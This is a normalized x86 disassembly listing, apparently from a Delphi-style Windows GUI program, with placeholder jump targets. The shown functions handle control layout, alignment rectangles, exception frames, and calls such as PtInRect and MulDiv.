cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_435c90
sub_43663e
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_434ed8
mov cl 0x1
sub_436680
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_434c30
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_434c30
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_4366b0
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0x60 ] 0x1
mov dl [ esi + 0x5f ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_4366d4
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov edx esp
mov eax [ ebx + 0x8 ]
call sub_4067a0
push esp
movsx ecx [ ebx + 0x6 ]
mov dl [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_4032f4
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_435c5c
mov [ ebx + 0xc ] eax
sub_436778
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_434b84
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_434b84
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_43680c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_403040
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_434224
mov edx [ esp ]
mov eax esi
call sub_434200
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_4344ac
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_4344f0
sub_436890
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_412598
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_4345a8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x44 ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_4125e8
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_434450
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43691c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_43680c
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax ebx
call sub_43b290
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_436890
pop ecx
jmp r-xdata
sub_43697c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_436a6a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436a71
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ed8
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_434ac0
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_434a90
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_434a90
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_4042c0
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_403f08
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_4349b0
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x120 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x124 ] eax
cmp [ esi + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_436a78
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xffef
call sub_4032f4
sub_436aa4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_436ac4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_436ae4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_436b04
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_436b24
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_436b44
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_436b64
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41a12c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_4340e4
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_4032f4
sub_436b9c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_436c38
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414110
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_441158
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_441290
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_434a90
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_440ff0
mov dl [ ebx + 0x57 ]
mov eax edi
call sub_4413b0
push [ ebx + 0x124 ]
push [ ebx + 0x120 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436c3f
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_436c48
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_436c84
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_436c48
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_436d34
push ebx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0xa0 ]
call sub_403284
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_436d68
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_436d88
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc8
call sub_4032f4
test al al
je r-xdata
mov eax edi
call sub_436dc8
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_436df4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_436e20
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx esp
mov eax [ ebp + 0x8 ]
call sub_4067a0
mov eax esp
call sub_412610
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_4345d4
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x1c ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_4032f4
xor eax eax
mov al [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_4032f4
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax edi
call sub_434600
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_412610
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x24 ]
xor edx edx
xor eax eax
call sub_412598
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax edi
call sub_4345a8
sub_436f48
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_436f88
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4337d4
mov eax esi
mov edx [ r-xdata ]
call sub_4032a8
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_436fbc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_4370b4
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_433b90
push ebx
push sub_438a4c
call sub_41ad6c
mov [ ebx + 0x18c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d34c
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_41d4f4
mov [ ebx + 0x1a9 ] 0x1
mov [ ebx + 0x1a0 ] 0xffffffff
mov [ ebx + 0x184 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_403404
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4523a0
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x188 ]
call sub_403f08
lea eax [ ebx + 0x188 ]
call sub_403eb4
jmp r-xdata
mov [ ebx + 0x1a7 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x162 ] al
mov [ ebx + 0x163 ] 0x2
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] 0x1
mov [ ebx + 0x150 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4370bb
lea eax [ ebp - 0x8 ]
call sub_403eb4
retn
sub_4370bb
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_4370e0
push ebx
push esi
push edi
call sub_40346c
mov ebx edx
mov edi eax
mov eax edi
call sub_419f7c
cmp [ edi + 0x1a8 ] 0x0
je r-xdata
lea eax [ edi + 0x17c ]
call sub_4054f0
mov eax [ edi + 0x178 ]
call sub_4030f8
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov [ edi + 0x1a8 ] 0x0
xor edx edx
mov eax edi
call sub_43273c
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_437d80
mov eax edi
call sub_437fc0
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ edi + 0x170 ]
call sub_4030f8
mov eax [ edi + 0x18c ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax edi
call sub_437f84
mov esi eax
mov edx esi
mov eax edi
call sub_437dec
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax edi
call sub_437fc0
test eax eax
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_433c68
test bl bl
jle r-xdata
call sub_41ae04
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403454
sub_4371b0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_437274
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_413bec
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4030f8
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_43b450
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_4139f4
mov edx [ eax + 0x1a0 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_413b40
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4139f4
test eax eax
je r-xdata
sub_437284
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_437b28
xor eax eax
push ebp
push sub_4372c4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_433ecc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4372cb
mov eax [ ebp - 0x4 ]
call sub_437b30
retn
sub_4372cb
mov eax [ ebp - 0x4 ]
call sub_4371b0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_438984
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_435c5c
sub_437300
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
xor ebx ebx
mov bl [ ebp - 0x1 ]
cmp ebx 0x6
ja r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
jmp [ ebx * 4 + jump_table_43731b ]
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setle cl
jmp r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setle cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
mov ecx eax
sub_43738c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x61 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43b594
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_412598
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_43770d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437714
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
jmp [ eax * 4 + jump_table_437622 ]
sub al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x6
ja r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_437585
